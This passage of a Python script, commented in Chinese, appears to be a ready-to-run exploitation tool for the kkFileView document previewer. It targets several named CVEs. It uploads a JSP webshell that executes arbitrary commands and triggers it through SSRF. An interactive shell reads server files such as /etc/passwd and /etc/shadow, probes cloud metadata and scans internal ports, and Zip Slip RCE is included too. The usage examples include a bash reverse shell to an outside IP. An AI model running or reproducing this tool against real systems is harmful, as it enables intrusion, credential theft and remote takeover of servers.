                    safe_print(f"{C.BLD}命令执行结果:{C.RST}")
                    safe_print(output[:3000])
                    safe_print(f"{C.GRN}{'=' * 50}{C.RST}\n")
                    return output
            except Exception:
                continue

        safe_print(f"\n{C.YLW}[*] 可能目标不是 LibreOffice 环境或路径不同{C.RST}")
        safe_print(f"{C.YLW}    尝试手动验证: /getCorsFile?urlPath=file:///tmp/kkfv_rce_{rk}.txt{C.RST}")
        return None

    finally:
        try:
            for f in [zip_path, odt_path]:
                if os.path.exists(f):
                    os.unlink(f)
            os.rmdir(tmpdir)
        except Exception:
            pass


def exploit_upload_rce_chain(url: str, s: requests.Session, command: str):
    """
    通过文件上传链实现 RCE:
    1. 上传 JSP/PHP webshell
    2. 通过 getCorsFile 触发 webshell 执行
    适用于同时存在文件上传 + 文件读取漏洞的场景
    """
    safe_print(f"\n{C.BLD}文件上传 RCE 链{C.RST}")
    safe_print(f"{C.BLD}命令: {command}{C.RST}\n")

    rk = randstr(6)
    shell_name = f"cmd_{rk}.jsp"
    shell_content = f'''<%@ page import="java.io.*" %>
<%
  String cmd = "{command}";
  Process p = Runtime.getRuntime().exec(cmd);
  BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
  String l;
  while ((l = r.readLine()) != null) out.println(l);
  r = new BufferedReader(new InputStreamReader(p.getErrorStream()));
  while ((l = r.readLine()) != null) out.println(l);
%>'''

    safe_print(f"  {C.CYN}[1/2] 上传 JSP webshell...{C.RST}")
    r = s.post(build_url(url, '/fileUpload'),
               files={'file': (shell_name, shell_content.encode(), 'application/octet-stream')},
               timeout=15)

    if r.status_code != 200:
        safe_print(f"  {C.RED}[-] 上传失败 (HTTP {r.status_code}){C.RST}")
        return None

    try:
        resp = r.json()
        safe_print(f"  响应: {str(resp)[:200]}")
    except Exception:
        safe_print(f"  响应: {r.text[:200]}")

    safe_print(f"  {C.CYN}[2/2] 触发 webshell 执行...{C.RST}")
    # 尝试多个可能路径
    shell_paths = [f'/{shell_name}', f'/file/{shell_name}', f'/upload/{shell_name}']
    for sp in shell_paths:
        try:
            rr = s.get(build_url(url, sp), timeout=15)
            if rr.status_code == 200 and len(rr.text) > 3:
                output = rr.text.strip()
                safe_print(f"\n{C.GRN}{'=' * 50}{C.RST}")
                safe_print(f"{C.BLD}命令输出:{C.RST}")
                safe_print(output[:3000])
                safe_print(f"{C.GRN}{'=' * 50}{C.RST}\n")
                return output
        except Exception:
            continue

    # 备用: 通过 SSRF 点触发
    safe_print(f"  {C.YLW}[*] 尝试通过 SSRF 触发 webshell...{C.RST}")
    for trigger in [
        f'/getCorsFile?urlPath=http://127.0.0.1/{shell_name}',
        f'/onlinePreview?url=http://127.0.0.1/{shell_name}',
    ]:
        try:
            rr = s.get(build_url(url, trigger), timeout=15)
            if len(rr.text) > 3:
                safe_print(f"\n{C.GRN}命令输出 (SSRF 触发):{C.RST}")
                safe_print(rr.text[:3000])
                return rr.text
        except Exception:
            continue

    safe_print(f"{C.RED}[-] 无法触发 webshell, 手动尝试访问: {url}/{shell_name}{C.RST}")
    return None


# ===================== 交互式 Shell =====================

def interactive_shell(url: str, s: requests.Session, vulns: List[str]):
    """全功能交互式利用 Shell"""
    safe_print(f"\n{C.GRN}[+] 进入交互式利用 Shell (输入 'help' 查看命令, 'exit' 退出){C.RST}")
    safe_print(f"{C.CYN}    目标: {url}{C.RST}")

    has_file_read = any('43734' in v or '任意文件读取' in v for v in vulns)
    has_ssrf = any('SSRF' in v or '42149' in v or '43140' in v for v in vulns)
    has_upload = any('4538' in v or '文件上传' in v for v in vulns)
    has_rce = any('Zip Slip' in v for v in vulns)

    # 快速检测能力
    if not has_file_read:
        try:
            r = s.get(build_url(url, "/getCorsFile?urlPath=file:///etc/passwd"), timeout=8)
            if 'root:' in r.text:
                has_file_read = True
        except Exception:
            pass

    if not has_upload:
        try:
            r = s.get(build_url(url, '/fileUpload'), timeout=5)
            if r.status_code != 404:
                has_upload = True
        except Exception:
            pass

    safe_print(f"{C.CYN}    能力: {('文件读取 ' if has_file_read else '')}"
               f"{('SSRF ' if has_ssrf else '')}"
               f"{('文件上传 ' if has_upload else '')}"
               f"{('RCE ' if has_rce else '')}{C.RST}\n")

    while True:
        try:
            cmd = input(f"{C.RED}kkFileView>{C.RST} ").strip()
            if not cmd:
                continue
            if cmd.lower() in ('exit', 'quit'):
                safe_print("退出")
                break

            parts = cmd.split(maxsplit=1)
            action = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ''

            # ===== help =====
            if action == 'help':
                safe_print(f"""
{C.BLD}可用命令:{C.RST}
  {C.GRN}read <path>{C.RST}       — 读取服务器文件 (CVE-2021-43734)
  {C.GRN}read /etc/passwd{C.RST}   —   例: 读取 /etc/passwd
  {C.GRN}ssrf <url>{C.RST}         — SSRF 请求 (CVE-2022-42149)
  {C.GRN}ssrf http://127.0.0.1:6379{C.RST} —   例: 探测内网 Redis
  {C.GRN}scan <host>{C.RST}        — SSRF 端口扫描
  {C.GRN}scan 127.0.0.1{C.RST}     —   例: 扫描 localhost
  {C.GRN}upload <file>{C.RST}      — 上传本地文件
  {C.GRN}upload shell.jsp{C.RST}   —   例: 上传 webshell
  {C.GRN}webshell <jsp|php>{C.RST} — 生成并上传 webshell
  {C.GRN}rce <command>{C.RST}      — Zip Slip RCE
  {C.GRN}rce id{C.RST}             —   例: 执行命令
  {C.GRN}info{C.RST}               — 显示目标和漏洞信息
  {C.GRN}clear{C.RST}              — 清屏
                """)
                continue

            # ===== clear =====
            if action == 'clear':
                os.system('cls' if os.name == 'nt' else 'clear')
                continue

            # ===== info =====
            if action == 'info':
                safe_print(f"\n{C.BLD}目标信息:{C.RST}")
                safe_print(f"  URL: {url}")
                safe_print(f"  文件读取: {'是' if has_file_read else '否'}")
                safe_print(f"  SSRF: {'是' if has_ssrf else '否'}")
                safe_print(f"  文件上传: {'是' if has_upload else '否'}")
                safe_print(f"  Zip Slip RCE: {'是' if has_rce else '否'}")
                if vulns:
                    safe_print(f"\n{C.RED}已确认漏洞:{C.RST}")
                    for v in vulns:
                        safe_print(f"  [!] {v}")
                continue

            # ===== read =====
            if action == 'read':
                if not arg:
                    safe_print(f"{C.YLW}用法: read <path>{C.RST}")
                    continue
                exploit_read_file(url, s, arg)
                continue

            # ===== ssrf =====
            if action == 'ssrf':
                if not arg:
                    safe_print(f"{C.YLW}用法: ssrf <url>{C.RST}")
                    continue
                safe_print(f"\n{C.BLD}SSRF 请求: {arg}{C.RST}")
                for ep, param in [('/onlinePreview', 'url'), ('/getCorsFile', 'urlPath')]:
                    try:
                        encoded = urllib.parse.quote(arg)
                        r = s.get(build_url(url, f"{ep}?{param}={encoded}"), timeout=15)
                        safe_print(f"\n{C.GRN}--- {ep} ---{C.RST}")
                        safe_print(f"HTTP {r.status_code}")
                        safe_print(r.text[:2000])
                    except Exception as e:
                        safe_print(f"  {ep}: {e}")
                continue

            # ===== scan =====
            if action == 'scan':
                target = arg or '127.0.0.1'
                quick_ports = [22, 80, 443, 3306, 6379, 8080, 8443, 9200, 27017]
                safe_print(f"\n{C.BLD}SSRF 端口扫描: {target}{C.RST}\n")
                for port in quick_ports:
                    try:
                        r = s.get(build_url(url,
                                  f"/onlinePreview?url={urllib.parse.quote(f'http://{target}:{port}/')}"),
                                  timeout=4, allow_redirects=False)
                        if r.status_code != 502 and r.status_code != 504:
                            banner = r.text[:80].replace('\n', ' ')
                            safe_print(f"  {C.GRN}[+] {port}/tcp OPEN — HTTP {r.status_code}, {len(r.text)}B [{banner}]...{C.RST}")
                    except requests.exceptions.Timeout:
                        safe_print(f"  {C.YLW}[*] {port}/tcp TIMEOUT (可能是开放端口){C.RST}")
                    except Exception:
                        pass
                continue

            # ===== upload =====
            if action == 'upload':
                if not arg:
                    safe_print(f"{C.YLW}用法: upload <本地文件路径> [远程文件名]{C.RST}")
                    continue
                parts2 = arg.split()
                local = parts2[0]
                remote = parts2[1] if len(parts2) > 1 else None
                if not os.path.exists(local):
                    safe_print(f"{C.RED}文件不存在: {local}{C.RST}")
                    continue
                exploit_upload_file(url, s, local, remote)
                continue

            # ===== webshell =====
            if action == 'webshell':
                stype = arg or 'jsp'
                exploit_upload_webshell(url, s, stype)
                continue

            # ===== rce =====
            if action == 'rce':
                if not arg:
                    safe_print(f"{C.YLW}用法: rce <命令>{C.RST}")
                    continue
                result = exploit_zip_slip_rce(url, s, arg)
                if not result:
                    safe_print(f"\n{C.YLW}[*] Zip Slip RCE 未成功, 尝试文件上传链...{C.RST}")
                    exploit_upload_rce_chain(url, s, arg)
                continue

            # ===== unknown =====
            safe_print(f"{C.YLW}未知命令: {cmd}, 输入 'help' 查看帮助{C.RST}")

        except KeyboardInterrupt:
            safe_print("\n输入 'exit' 退出")
        except EOFError:
            break
        except Exception as e:
            safe_print(f"{C.RED}错误: {e}{C.RST}")


# ===================== 主入口 =====================

def main():
    banner()

    parser = argparse.ArgumentParser(
        description='kkFileView 综合漏洞检测/利用工具 v2.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  # 综合检测
  python kkfileview_check.py -u http://192.168.1.100:8012

  # 读取服务器文件
  python kkfileview_check.py -u http://target.com read /etc/passwd
  python kkfileview_check.py -u http://target.com read /etc/shadow -o shadow.txt

  # SSRF 内网探测
  python kkfileview_check.py -u http://target.com ssrf http://169.254.169.254/latest/meta-data/
  python kkfileview_check.py -u http://target.com ssrf --scan 192.168.1.1 --ports 22,80,3306,6379,8080

  # 文件上传利用
  python kkfileview_check.py -u http://target.com upload --file shell.jsp
  python kkfileview_check.py -u http://target.com upload --webshell jsp
  python kkfileview_check.py -u http://target.com upload --webshell php

  # Zip Slip RCE
  python kkfileview_check.py -u http://target.com rce "whoami"
  python kkfileview_check.py -u http://target.com rce "bash -c 'exec bash -i &>/dev/tcp/10.0.0.1/4444 <&1'"

  # 交互式利用 Shell
  python kkfileview_check.py -u http://target.com shell

  # 其他选项
  python kkfileview_check.py -u http://target.com --proxy http://127.0.0.1:8080 --timeout 15 --no-color
        ''',
    )

    # 通用参数
    parser.add_argument('-u', '--url', required=True, help='目标 URL (例: http://target:8012)')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时秒数 (默认 10)')
    parser.add_argument('--no-color', action='store_true', help='禁用彩色输出')
    parser.add_argument('--proxy', help='HTTP 代理 (例: http://127.0.0.1:8080)')
    parser.add_argument('--no-upload', action='store_true', help='跳过所有文件上传类检测/利用')

    # 子命令
    sub = parser.add_subparsers(dest='mode', help='攻击模式')

    # === check ===
    check_p = sub.add_parser('check', help='综合漏洞检测 (默认)',
                              formatter_class=argparse.RawDescriptionHelpFormatter)
    check_p.add_argument('--callback', help='SSRF 回显验证地址')

    # === read ===
    read_p = sub.add_parser('read', help='任意文件读取利用 (CVE-2021-43734)',
                             formatter_class=argparse.RawDescriptionHelpFormatter)
    read_p.add_argument('path', help='要读取的文件路径 (例: /etc/passwd)')
    read_p.add_argument('-o', '--output', help='保存到本地文件')

    # === ssrf ===
    ssrf_p = sub.add_parser('ssrf', help='SSRF 利用 (CVE-2022-42149)',
                             formatter_class=argparse.RawDescriptionHelpFormatter)
    ssrf_p.add_argument('target', nargs='?', help='SSRF 目标 URL (不带参数则使用 --scan)')
    ssrf_p.add_argument('--scan', help='端口扫描目标 IP')
    ssrf_p.add_argument('--ports', help='扫描端口 (例: 22,80,443 或 1-1000)')

    # === upload ===
    upload_p = sub.add_parser('upload', help='文件上传利用 (CVE-2025-4538)',
                               formatter_class=argparse.RawDescriptionHelpFormatter)
    upload_p.add_argument('--file', help='要上传的本地文件路径')
    upload_p.add_argument('--name', help='远程文件名 (默认使用本地文件名)')
    upload_p.add_argument('--webshell', choices=['jsp', 'php'], help='生成并上传 webshell')

    # === rce ===
    rce_p = sub.add_parser('rce', help='RCE 利用 (QVD-2024-14703 Zip Slip)',
                            formatter_class=argparse.RawDescriptionHelpFormatter)
    rce_p.add_argument('command', help='要执行的命令')
    rce_p.add_argument('--chain', action='store_true',
                        help='使用文件上传链 (上传 webshell 后触发)')

    # === shell ===
    shell_p = sub.add_parser('shell', help='交互式利用 Shell',
                              formatter_class=argparse.RawDescriptionHelpFormatter)

    args = parser.parse_args()

    # 无子命令时默认执行 check
    if not args.mode:
        args.mode = 'check'

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith('_'):
                setattr(C, attr, '')

    url = args.url.rstrip('/')
    s = new_session(args.timeout)

    if args.proxy:
        s.proxies = {'http': args.proxy, 'https': args.proxy}
        safe_print(f"{C.CYN}[*] 代理: {args.proxy}{C.RST}")

    safe_print(f"{C.BLD}目标: {url}{C.RST}")

    # ===== dispatch =====
    if args.mode == 'check':
        run_all_checks(url, s, args)

    elif args.mode == 'read':
        exploit_read_file(url, s, args.path, args.output)

    elif args.mode == 'ssrf':
        if args.scan:
            exploit_ssrf_port_scan(url, s, args.scan, args.ports)
        elif args.target:
            safe_print(f"\n{C.BLD}SSRF 请求: {args.target}{C.RST}")
            full_url = build_url(url, f"/onlinePreview?url={urllib.parse.quote(args.target)}")
            try:
                r = s.get(full_url, timeout=15)
                safe_print(f"\nHTTP {r.status_code}")
                safe_print(r.text[:3000])
            except Exception as e:
                safe_print(f"{C.RED}请求失败: {e}{C.RST}")
        else:
            safe_print(f"{C.YLW}请指定 SSRF 目标 URL 或使用 --scan 进行端口扫描{C.RST}")

    elif args.mode == 'upload':
        if args.webshell:
            exploit_upload_webshell(url, s, args.webshell)
        elif args.file:
            exploit_upload_file(url, s, args.file, args.name)
        else:
            safe_print(f"{C.YLW}请使用 --file 指定文件或 --webshell 生成 webshell{C.RST}")

    elif args.mode == 'rce':
        if args.chain:
            exploit_upload_rce_chain(url, s, args.command)
        else:
            result = exploit_zip_slip_rce(url, s, args.command)
            if result is None:
                safe_print(f"\n{C.YLW}[*] Zip Slip RCE 未成功, 尝试 --chain 文件上传链...{C.RST}")
                exploit_upload_rce_chain(url, s, args.command)

    elif args.mode == 'shell':
        vulns = []
        safe_print(f"{C.CYN}[*] 快速探测漏洞能力...{C.RST}")
        f_hits, _ = check_cve_2021_43734(url, s)
        vulns.extend(f_hits)
        vulns.extend(check_ssrf(url, s))
        vulns.extend(check_zip_slip_rce(url, s))
        vulns.extend(check_cve_2025_4538(url, s))
        interactive_shell(url, s, vulns)

    safe_print("")


if __name__ == '__main__':
    main()
